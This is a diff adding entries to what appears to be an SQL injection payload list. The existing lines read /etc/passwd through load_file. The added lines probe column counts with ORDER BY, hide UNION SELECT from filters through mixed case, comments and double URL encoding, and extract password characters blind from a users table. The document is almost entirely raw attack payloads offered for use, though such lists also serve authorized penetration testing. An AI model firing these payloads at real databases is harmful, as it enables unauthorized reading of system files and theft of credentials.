@@ -54,3 +54,22 @@ UNI/**/ON SEL/**/ECT
 ' union select 1,load_file('/etc/passwd'),1,1,1;
 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
 ' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
++OrdEr+bY+1
++OrdEr+bY+2
++OrdEr+bY+3
++OrdEr+bY+4
++OrdEr+bY+5
++OrdEr+bY+6
++OrdEr+bY+7
++OrdEr+bY+8
++OrdEr+bY+9
++OrdEr+bY+10
+%20Union%20Select%20
+‘ and (select substr(group_concat(pass),1,1) from users)=’a
+‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a
+or 1=convert(int,(USER))--
+%%2075%%75%%6E6E%%6969%%6F6F%%6E6E%20%%7373%%6565%%6C6C%%6565%%6363%%7474%20%%3131%%2C2C%%3232%%2C2C%%3333
+%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%20
+uni%6fn distinct%52OW s%65lect
+%00(!*unIoN*)union+(!*SelEcT*)select+
+|| substr(user,1,1) = lower(conv(11,10,36)
